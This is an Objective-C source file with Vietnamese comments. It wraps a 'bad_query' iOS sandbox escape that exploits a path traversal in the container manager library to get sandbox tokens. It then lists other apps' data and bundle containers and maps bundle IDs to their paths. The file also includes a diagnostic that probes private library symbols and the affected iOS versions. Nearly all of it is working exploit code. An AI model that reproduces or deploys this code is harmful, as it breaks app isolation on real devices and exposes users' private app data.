/*
 * BadQueryManager.m
 *
 * Cơ chế C: sandbox escape qua containermanager path traversal (bad_query).
 * Thử 2 route song song, log kết quả chi tiết để debug trên iOS 18.7.x.
 *
 * bad_query không cần kernel exploit — chỉ cần libsystem_containermanager.dylib
 * có lỗ hổng path traversal (iOS 26.0–26.6.1 confirmed, iOS 18.x untested).
 */

#import "BadQueryManager.h"
#import "DebugLogger.h"
#import <UIKit/UIKit.h>
#include "bad_query.h"
#include <dlfcn.h>   // dlopen/dlclose/dlerror — cần cho dylib path check trong runDiagnostic

#define BQ_LOG(fmt, ...) \
    do { \
        NSString *_msg = [NSString stringWithFormat:@"[BQ] " fmt, ##__VA_ARGS__]; \
        NSLog(@"%@", _msg); \
        [[DebugLogger sharedLogger] log:@"%@", _msg]; \
    } while(0)

// Container path bị restricted
static NSString * const kDataContainerRoot = @"/var/mobile/Containers/Data/Application";

// Route định nghĩa
typedef struct {
    const char *group;       // NULL = SystemGroup (class 13), non-NULL = AppGroup (class 7)
    const char *label;
} BQRoute;

static const BQRoute kRoutes[] = {
    { NULL,                   "SystemGroup (class 13)" },
    { "group.com.imguidelta", "AppGroup (class 7)"     },
};
static const int kRouteCount = 2;

// ── State ─────────────────────────────────────────────────────────────────────

static BOOL   gBQActive      = NO;
static int64_t gActiveHandle = -1;  // handle giữ sandbox extension còn sống

// ── BadQueryManager ───────────────────────────────────────────────────────────

@implementation BadQueryManager

+ (BOOL)active { return gBQActive; }

// ── activate ──────────────────────────────────────────────────────────────────

+ (void)activateWithCompletion:(void (^)(BOOL))completion {
    if (gBQActive) {
        // Đã active rồi — gọi completion ngay
        dispatch_async(dispatch_get_main_queue(), ^{ if (completion) completion(YES); });
        return;
    }

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSString *ver = [[UIDevice currentDevice] systemVersion];
        BQ_LOG(@"🚀 Kích hoạt Cơ chế C — iOS %@", ver);

        const char *targetPath = kDataContainerRoot.UTF8String;
        BOOL success = NO;

        for (int i = 0; i < kRouteCount && !success; i++) {
            const char *group = kRoutes[i].group;
            const char *label = kRoutes[i].label;

            BQ_LOG(@"🔍 Route [%d/%d] %s → target: %s",
                   i + 1, kRouteCount, label, targetPath);

            int64_t handle = bad_query(
                (char *)targetPath,
                true,               // create=true: skip lstat (path có thể sandbox-hidden)
                (char *)group,
                false               // is_group=false cho Data containers
            );

            BQ_LOG(@"   bad_query result: %lld", handle);

            if (handle > 0) {
                BQ_LOG(@"✅ Route %s THÀNH CÔNG — handle=%lld", label, handle);
                gActiveHandle = handle;
                gBQActive     = YES;
                success        = YES;

                // Verify: thử đọc thư mục
                NSFileManager *fm = [NSFileManager defaultManager];
                NSError *err = nil;
                NSArray *items = [fm contentsOfDirectoryAtPath:kDataContainerRoot error:&err];
                if (err) {
                    BQ_LOG(@"⚠️  contentsOfDirectory thất bại: %@", err.localizedDescription);
                } else {
                    BQ_LOG(@"📂 contentsOfDirectory: %lu container(s)", (unsigned long)items.count);
                }

            } else {
                // Log lý do thất bại
                NSString *reason = [BadQueryManager _describeErrorCode:handle];
                BQ_LOG(@"❌ Route %s thất bại: %lld (%@)", label, handle, reason);
            }
        }

        if (!success) {
            BQ_LOG(@"❌ Tất cả routes thất bại — bad_query không hỗ trợ iOS %@", ver);
        }

        dispatch_async(dispatch_get_main_queue(), ^{
            if (completion) completion(success);
        });
    });
}

// ── containerPathForBundleID ──────────────────────────────────────────────────

+ (nullable NSString *)containerPathForBundleID:(NSString *)bundleID {
    if (!gBQActive || !bundleID.length) return nil;

    NSFileManager *fm = [NSFileManager defaultManager];
    NSError *err = nil;
    NSArray<NSString *> *uuids = [fm contentsOfDirectoryAtPath:kDataContainerRoot error:&err];
    if (!uuids || err) {
        BQ_LOG(@"⚠️  containerPathForBundleID: không liệt kê được %@ (err=%@)",
               kDataContainerRoot, err.localizedDescription);
        return nil;
    }

    for (NSString *uuid in uuids) {
        NSString *uuidPath = [kDataContainerRoot stringByAppendingPathComponent:uuid];
        NSString *metaPath = [uuidPath stringByAppendingPathComponent:
            @".com.apple.mobile_container_manager.metadata.plist"];
        NSDictionary *meta = [NSDictionary dictionaryWithContentsOfFile:metaPath];
        NSString *bid = meta[@"MCMMetadataIdentifier"];
        if ([bid isEqualToString:bundleID]) {
            BQ_LOG(@"✅ [BQ] Found %@ → %@", bundleID, uuidPath);
            return uuidPath;
        }
    }

    BQ_LOG(@"⚠️  containerPathForBundleID: không tìm thấy %@", bundleID);
    return nil;
}

// ── allContainerPaths ─────────────────────────────────────────────────────────

+ (NSDictionary<NSString *, NSString *> *)allContainerPaths {
    if (!gBQActive) return @{};

    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray<NSString *> *uuids = [fm contentsOfDirectoryAtPath:kDataContainerRoot error:nil];
    if (!uuids) return @{};

    NSMutableDictionary<NSString *, NSString *> *result = [NSMutableDictionary dictionary];
    for (NSString *uuid in uuids) {
        NSString *uuidPath = [kDataContainerRoot stringByAppendingPathComponent:uuid];
        NSString *metaPath = [uuidPath stringByAppendingPathComponent:
            @".com.apple.mobile_container_manager.metadata.plist"];
        NSDictionary *meta = [NSDictionary dictionaryWithContentsOfFile:metaPath];
        NSString *bid = meta[@"MCMMetadataIdentifier"];
        if (bid.length > 0) result[bid] = uuidPath;
    }

    BQ_LOG(@"📦 allContainerPaths: %lu app(s)", (unsigned long)result.count);
    return [result copy];
}

// ── runDiagnostic ─────────────────────────────────────────────────────────────

+ (NSString *)runDiagnostic {
    NSMutableString *log = [NSMutableString string];
    NSString *ver = [[UIDevice currentDevice] systemVersion];

    void (^addLine)(NSString *) = ^(NSString *line) {
        [log appendFormat:@"%@\n", line];
        NSLog(@"[BQ-Diag] %@", line);
    };

    addLine([NSString stringWithFormat:@"=== bad_query diagnostic — iOS %@ ===", ver]);
    addLine([NSString stringWithFormat:@"active = %@", gBQActive ? @"YES" : @"NO"]);
    addLine(@"");

    // Kiểm tra thủ công từng path của containermanager dylib
    addLine(@"── containermanager dylib paths ──");
    const char * const dylibPaths[] = {
        "/usr/lib/system/libsystem_containermanager.dylib",
        "/usr/lib/libsystem_containermanager.dylib",
        "/System/Library/PrivateFrameworks/MobileContainerManager.framework/MobileContainerManager",
        NULL
    };
    for (int i = 0; dylibPaths[i]; i++) {
        void *h = dlopen(dylibPaths[i], RTLD_NOW | RTLD_LOCAL | RTLD_NOLOAD);
        NSString *pathStr = [NSString stringWithUTF8String:dylibPaths[i]];
        NSString *shortPath = pathStr.lastPathComponent;
        if (h) {
            addLine([NSString stringWithFormat:@"  ✅ %@", shortPath]);
            dlclose(h);
        } else {
            addLine([NSString stringWithFormat:@"  ❌ %@ — %s", shortPath, dlerror() ?: "not found"]);
        }
    }
    addLine(@"");

    // Test từng symbol trong libsystem_containermanager
    addLine(@"── symbols (libsystem_containermanager) ──");
    void *diagLib = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
                           RTLD_NOW | RTLD_LOCAL);
    if (!diagLib) diagLib = dlopen("/usr/lib/libsystem_containermanager.dylib",
                                   RTLD_NOW | RTLD_LOCAL);
    if (diagLib) {
        // Kiểm tra cả 2 tên: iOS 26 dùng "operation_set_part*", iOS 18 dùng "set_part*"
        const char *syms[] = {
            "container_query_create",
            "container_query_set_class",
            "container_query_set_group_identifiers",
            "container_query_operation_set_flags",
            "container_query_operation_set_part",        // iOS 26
            "container_query_set_part",                  // iOS 18 fallback
            "container_query_operation_set_part_domain", // iOS 26
            "container_query_set_part_domain",           // iOS 18 fallback
            "container_query_get_single_result",
            "container_query_free",
            "container_copy_sandbox_token",
            NULL
        };
        for (int i = 0; syms[i]; i++) {
            void *sym = dlsym(diagLib, syms[i]);
            addLine([NSString stringWithFormat:@"  %s %s",
                     sym ? "✅" : "❌", syms[i]]);
        }
        dlclose(diagLib);
    } else {
        addLine(@"  ❌ không mở được lib để test symbols");
    }
    addLine(@"");

    const char *dataPath = kDataContainerRoot.UTF8String;
    const char *bundlePath = "/var/containers/Bundle/Application";

    struct { const char *path; const char *label; } targetPaths[] = {
        { dataPath,   "Data   /var/mobile/Containers/Data/Application" },
        { bundlePath, "Bundle /var/containers/Bundle/Application"      },
    };

    for (int pi = 0; pi < 2; pi++) {
        addLine([NSString stringWithFormat:@"── %s ──", targetPaths[pi].label]);

        for (int ri = 0; ri < kRouteCount; ri++) {
            const char *group = kRoutes[ri].group;
            const char *label = kRoutes[ri].label;

            int64_t handle = bad_query((char*)targetPaths[pi].path, true, (char*)group, false);
            NSString *desc = [BadQueryManager _describeErrorCode:handle];
            NSString *line;

            if (handle > 0) {
                // Kiểm tra có đọc được không
                NSFileManager *fm = [NSFileManager defaultManager];
                NSArray *items = [fm contentsOfDirectoryAtPath:
                    [NSString stringWithUTF8String:targetPaths[pi].path] error:nil];
                line = [NSString stringWithFormat:
                    @"  %s → ✅ handle=%lld, dir=%lu items",
                    label, handle, (unsigned long)items.count];
                bad_query_release(handle);
            } else {
                line = [NSString stringWithFormat:@"  %s → ❌ %lld (%@)", label, handle, desc];
            }
            addLine(line);
        }
        addLine(@"");
    }

    addLine(@"=== end ===");
    return [log copy];
}

// ── helpers ───────────────────────────────────────────────────────────────────

+ (NSString *)_describeErrorCode:(int64_t)code {
    switch (code) {
        case -1:   return @"dlopen thất bại (containermanager không tải được)";
        case -6:   return @"dlsym thất bại (tên hàm khác — xem section symbols phía trên)";
        case -2:   return @"container_query_create thất bại";
        case -3:   return @"containermanager từ chối (iOS version không bị ảnh hưởng)";
        case -4:   return @"kernel từ chối cấp sandbox token (đã patch)";
        case -5:   return @"asprintf thất bại";
        case -254: return @"lstat() thất bại — path không tồn tại";
        case -255: return @"path không phải absolute";
        default:
            if (code > 0) return [NSString stringWithFormat:@"thành công (handle=%lld)", code];
            return [NSString stringWithFormat:@"lỗi không xác định (%lld)", code];
    }
}

@end
